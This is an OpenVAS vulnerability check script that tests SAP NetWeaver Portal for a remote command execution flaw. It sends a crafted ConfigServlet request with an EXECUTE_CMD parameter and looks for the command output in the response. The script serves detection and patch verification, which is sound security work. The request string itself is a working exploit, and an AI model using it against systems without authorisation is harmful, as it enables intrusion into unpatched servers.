###############################################################################
# OpenVAS Vulnerability Test
#
# SAP NetWeaver Portal 'ConfigServlet' Remote Code Execution
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103700");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");

  script_name("SAP NetWeaver Portal 'ConfigServlet' Remote Code Execution");

  script_xref(name:"URL", value:"http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24963/");

  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2013-04-18 16:24:58 +0200 (Thu, 18 Apr 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("SAP/banner");

  script_tag(name:"solution", value:"Updates are available.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"SAP NetWeaver Portal is prone to a remote code-execution vulnerability.

Successfully exploiting these issues may allow an attacker to execute
arbitrary code with the privileges of the user running the affected
application.");
  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:80);

banner = http_get_remote_headers(port:port);
if(!banner || tolower(banner) !~ "server: sap.*")exit(0);

commands = exploit_commands();

foreach cmd (keys(commands)) {

  url = '/ctc/servlet/ConfigServlet/?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=' + commands[cmd];

  if(buf = http_vuln_check(port:port, url:url,pattern:cmd)) {

      report = 'The Scanner was able to execute the command "' + commands[cmd] + '" on the remote host by\nrequesting the url\n\n' + url + '\n\nwhich produced the following response:\n<response>\n' + buf + '</response>\n';

      security_message(port:port, data: report);
      exit(0);

  }

}

exit(0);
